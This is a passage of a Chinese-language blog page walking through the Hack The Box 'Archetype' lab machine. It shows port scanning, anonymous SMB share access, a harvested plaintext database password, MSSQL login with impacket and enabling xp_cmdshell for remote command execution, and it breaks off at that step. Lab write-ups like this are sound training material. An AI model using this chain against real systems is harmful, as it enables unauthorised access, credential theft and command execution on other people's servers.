<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB-Starting Point | 0opsdc</title><meta name=keywords content="Hack The Box"><meta name=description content="Archetype 目标：拿到用户权限与系统权限。
靶机IP：10.10.10.27。
1、信息收集 先使用nmap看看靶机开放了什么端口：
sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient："><meta name=author content="0opsdc"><link rel=canonical href=https://oopsdc.com/post/htb-starting-point/><link crossorigin=anonymous href=/assets/css/stylesheet.56b5cc8c8054cf5f30eac4b81af2021f829171098f6e116bb016ed77e3264a36.css integrity="sha256-VrXMjIBUz18w6sS4GvICH4KRcQmPbhFrsBbtd+MmSjY=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB-Starting Point"><meta property="og:description" content="Archetype 目标：拿到用户权限与系统权限。
靶机IP：10.10.10.27。
1、信息收集 先使用nmap看看靶机开放了什么端口：
sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient："><meta property="og:type" content="article"><meta property="og:url" content="https://oopsdc.com/post/htb-starting-point/"><meta property="og:image" content="https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-09-01T15:03:30+08:00"><meta property="article:modified_time" content="2021-09-01T15:03:30+08:00"><meta property="og:site_name" content="0opsdc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB-Starting Point"><meta name=twitter:description content="Archetype 目标：拿到用户权限与系统权限。
靶机IP：10.10.10.27。
1、信息收集 先使用nmap看看靶机开放了什么端口：
sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient："><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.com/post/"},{"@type":"ListItem","position":2,"name":"HTB-Starting Point","item":"https://oopsdc.com/post/htb-starting-point/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB-Starting Point","name":"HTB-Starting Point","description":"Archetype 目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：","keywords":["Hack The Box"],"articleBody":"Archetype 目标：拿到用户权限与系统权限。\n靶机IP：10.10.10.27。\n1、信息收集 先使用nmap看看靶机开放了什么端口：\nsudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：\nsmbclient -N -L //10.10.10.27/ # 参数讲解 N：匿名登录 L：获取共享资源列表 # 结果 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available 获取到了共享资源列表，说明允许匿名访问SMB服务，文件夹后面的$代表为隐藏文件夹，接下来我们匿名登录看一下backups文件夹的内容：\nsmbclient -N //10.10.10.27/backups # 列出当前目录下的文件 smb: \\\u003e dir . D 0 Mon Jan 20 20:20:57 2020 .. D 0 Mon Jan 20 20:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 10328063 blocks of size 4096. 8260548 blocks available # 下载prod.dtsConfig文件 smb: \\\u003e get prod.dtsConfig getting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec) 下载的文件会默认存储在当前目录，查看prod.dtsConfig文件：\nvim prod.dtsConfig ","wordCount":"1781","inLanguage":"en","datePublished":"2021-09-01T15:03:30+08:00","dateModified":"2021-09-01T15:03:30+08:00","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.com/post/htb-starting-point/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://oopsdc.com/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://oopsdc.com/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://oopsdc.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://oopsdc.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://oopsdc.com/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://oopsdc.com/>Home</a>&nbsp;»&nbsp;<a href=https://oopsdc.com/post/>Posts</a></div><h1 class=post-title>HTB-Starting Point</h1><div class=post-meta>Created:&nbsp;<span title='2021-09-01 15:03:30 +0800 CST'>2021-09-01</span>&nbsp;·&nbsp;Updated:&nbsp;2021-09-01&nbsp;·&nbsp;0opsdc<div class=meta-item>&nbsp·&nbsp
        <span id=busuanzi_container_page_pv>Article Views: <span id=busuanzi_value_page_pv></span> times</span></div></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#archetype aria-label=Archetype>Archetype</a><ul><li><a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=1、信息收集>1、信息收集</a></li><li><a href=#2%e6%8b%bfshell aria-label=2、拿Shell>2、拿Shell</a></li><li><a href=#3%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=3、获取用户权限>3、获取用户权限</a></li><li><a href=#4%e6%8f%90%e6%9d%83 aria-label=4、提权>4、提权</a></li></ul></li><li><a href=#oopsie aria-label=Oopsie>Oopsie</a><ul><li><a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-1 aria-label=1、信息收集>1、信息收集</a></li><li><a href=#2%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90 aria-label=2、获取用户权限>2、获取用户权限</a></li><li><a href=#3%e6%8f%90%e6%9d%83 aria-label=3、提权>3、提权</a><ul><li><a href=#%e6%96%b9%e6%b3%95%e4%b8%80 aria-label=方法一>方法一</a></li><li><a href=#%e6%96%b9%e6%b3%95%e4%ba%8c%e6%8e%a8%e8%8d%90 aria-label=方法二（推荐）>方法二（推荐）</a></li></ul></li></ul></li><li><a href=#accine aria-label=Accine>Accine</a><ul><li><a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-2 aria-label=1、信息收集>1、信息收集</a></li><li><a href=#2%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90-1 aria-label=2、获取用户权限>2、获取用户权限</a></li><li><a href=#3%e6%8f%90%e6%9d%83-1 aria-label=3、提权>3、提权</a></li></ul></li><li><a href=#shield aria-label=Shield>Shield</a><ul><li><a href=#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-3 aria-label=1、信息收集>1、信息收集</a></li><li><a href=#2%e6%8b%bfwebshell aria-label=2、拿WebShell>2、拿WebShell</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=archetype>Archetype<a hidden class=anchor aria-hidden=true href=#archetype>#</a></h1><blockquote><p>目标：拿到用户权限与系统权限。</p><p>靶机IP：10.10.10.27。</p></blockquote><h2 id=1信息收集>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集>#</a></h2><p>先使用<code>nmap</code>看看靶机开放了什么端口：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sS -sV 10.10.10.27
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 参数讲解</span>
</span></span><span style=display:flex><span>sS：使用SYN半开放式扫描，扫描快，隐蔽性高
</span></span><span style=display:flex><span>sV：探测服务版本
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 扫描结果</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.27 <span style=color:#f92672>(</span>10.10.10.27<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>996</span> closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE      VERSION
</span></span><span style=display:flex><span>135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds Microsoft Windows Server <span style=color:#ae81ff>2008</span> R2 - <span style=color:#ae81ff>2012</span> microsoft-ds
</span></span><span style=display:flex><span>1433/tcp open  ms-sql-s     Microsoft SQL Server <span style=color:#ae81ff>2017</span> 14.00.1000
</span></span><span style=display:flex><span>Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>比较容易入手的就是<code>445端口</code>对应的<code>SMB服务</code>，<code>1433</code>是<code>SQL Server</code>的默认端口。先尝试能否匿名访问<code>SMB服务</code>，这里使用<code>Kali</code>预装的<code>smbclient</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient -N -L //10.10.10.27/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 参数讲解</span>
</span></span><span style=display:flex><span>N：匿名登录
</span></span><span style=display:flex><span>L：获取共享资源列表
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果</span>
</span></span><span style=display:flex><span>	Sharename       Type      Comment
</span></span><span style=display:flex><span>	---------       ----      -------
</span></span><span style=display:flex><span>	ADMIN$          Disk      Remote Admin
</span></span><span style=display:flex><span>	backups         Disk      
</span></span><span style=display:flex><span>	C$              Disk      Default share
</span></span><span style=display:flex><span>	IPC$            IPC       Remote IPC
</span></span><span style=display:flex><span>SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>获取到了共享资源列表，说明允许匿名访问<code>SMB服务</code>，文件夹后面的<code>$</code>代表为隐藏文件夹，接下来我们匿名登录看一下<code>backups</code>文件夹的内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient -N //10.10.10.27/backups
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 列出当前目录下的文件</span>
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> dir
</span></span><span style=display:flex><span>  .                                   D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:20:57 <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>  prod.dtsConfig                     AR      <span style=color:#ae81ff>609</span>  Mon Jan <span style=color:#ae81ff>20</span> 20:23:02 <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#ae81ff>10328063</span> blocks of size 4096. <span style=color:#ae81ff>8260548</span> blocks available
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 下载prod.dtsConfig文件</span>
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> get prod.dtsConfig
</span></span><span style=display:flex><span>getting file <span style=color:#ae81ff>\p</span>rod.dtsConfig of size <span style=color:#ae81ff>609</span> as prod.dtsConfig <span style=color:#f92672>(</span>0.5 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 0.5 KiloBytes/sec<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>下载的文件会默认存储在当前目录，查看<code>prod.dtsConfig</code>文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>vim prod.dtsConfig
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;DTSConfiguration&gt;
</span></span><span style=display:flex><span>    &lt;DTSConfigurationHeading&gt;
</span></span><span style=display:flex><span>        &lt;DTSConfigurationFileInfo GeneratedBy<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageName<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedDate<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;20.1.2019 10:01:34&#34;</span>/&gt;
</span></span><span style=display:flex><span>    &lt;/DTSConfigurationHeading&gt;
</span></span><span style=display:flex><span>    &lt;Configuration ConfiguredType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Property&#34;</span> Path<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> ValueType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;String&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;ConfiguredValue&gt;Data Source<span style=color:#f92672>=</span>.;Password<span style=color:#f92672>=</span>M3g4c0rp123;User ID<span style=color:#f92672>=</span>ARCHETYPE<span style=color:#ae81ff>\s</span>ql_svc;Initial Catalog<span style=color:#f92672>=</span>Catalog;Provider<span style=color:#f92672>=</span>SQLNCLI10.1;Persist Security Info<span style=color:#f92672>=</span>True;Auto Translate<span style=color:#f92672>=</span>False;&lt;/ConfiguredValue&gt;
</span></span><span style=display:flex><span>    &lt;/Configuration&gt;
</span></span><span style=display:flex><span>&lt;/DTSConfiguration&gt; 
</span></span></code></pre></div><p>这个文件包含了一些数据库连接参数的配置，我们得到帐密<code>ARCHETYPE\sql_svc，M3g4c0rp123</code>。</p><p><code>SQL Server</code>有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，<code>ARCHETYPE</code>代表主机名，<code>sql_svc</code>代表具有数据库登录权限的操作系统用户名，<code>M3g4c0rp123</code>就是密码。</p><h2 id=2拿shell>2、拿Shell<a hidden class=anchor aria-hidden=true href=#2拿shell>#</a></h2><p>根据<code>nmap</code>扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。</p><p>需要的工具：<a href=https://github.com/SecureAuthCorp/impacket>SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)</a></p><p>这是一个用<code>Python</code>编写的后工具集，本次渗透要用到其中的<code>mssqlclient.py</code>，安装过程不再赘述。</p><p>使用操作系统身份验证登录数据库：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 输入密码后登录成功</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 数据库身份认证启用了TLS</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Encryption required, switching to TLS
</span></span><span style=display:flex><span><span style=color:#75715e># 当前数据库为master</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>DATABASE<span style=color:#f92672>)</span>: Old Value: master, New Value: master
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>LANGUAGE<span style=color:#f92672>)</span>: Old Value: , New Value: us_english
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>PACKETSIZE<span style=color:#f92672>)</span>: Old Value: 4096, New Value: <span style=color:#ae81ff>16192</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed database context to <span style=color:#e6db74>&#39;master&#39;</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed language setting to us_english.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ACK: Result: <span style=color:#ae81ff>1</span> - Microsoft SQL Server <span style=color:#f92672>(</span><span style=color:#ae81ff>140</span> 3232<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
</span></span></code></pre></div><p>登录成功后使用<code>SQL Server</code>的<code>IS_SRVROLEMEMBER('sysadmin')</code>判断当前数据库用户是否具有<code>sysadmin</code>权限：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>)
</span></span><span style=display:flex><span>              
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
</span></span><span style=display:flex><span><span style=color:#75715e>-----------   
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>          <span style=color:#ae81ff>1</span> 
</span></span></code></pre></div><p>返回结果为1，代表当前数据库用户具有<code>sysadmin</code>权限，可进一步尝试使用<code>xp_cmdshell</code>实现<code>RCE</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>#</span> sp_configure修改数据库配置的存储过程<span style=color:#960050;background-color:#1e0010>，当</span><span style=color:#66d9ef>show</span> advanced options参数为1时<span style=color:#960050;background-color:#1e0010>，才能够修改数据库配置中的某些高级选项，其中就有</span>xp_cmdshell<span style=color:#960050;background-color:#1e0010>，因此需要先设置</span><span style=color:#66d9ef>show</span> advanced options参数
</span></span><span style=display:flex><span><span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;show advanced options&#39;</span>, <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span>sp_configure存储过程更改的配置选项
</span></span><span style=display:flex><span>reconfigure
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>使用</span>sp_configure存储过程启用xp_cmdshell参数<span style=color:#960050;background-color:#1e0010>，此参数启用后允许</span><span style=color:#66d9ef>SQL</span> Server调用操作系统命令
</span></span><span style=display:flex><span><span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span> sp_configure存储过程更改的配置选项
</span></span><span style=display:flex><span>reconfigure
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>以上命令也可使用</span>mssqlclient的shell命令一步实现
</span></span><span style=display:flex><span>enable_xp_cmdshell
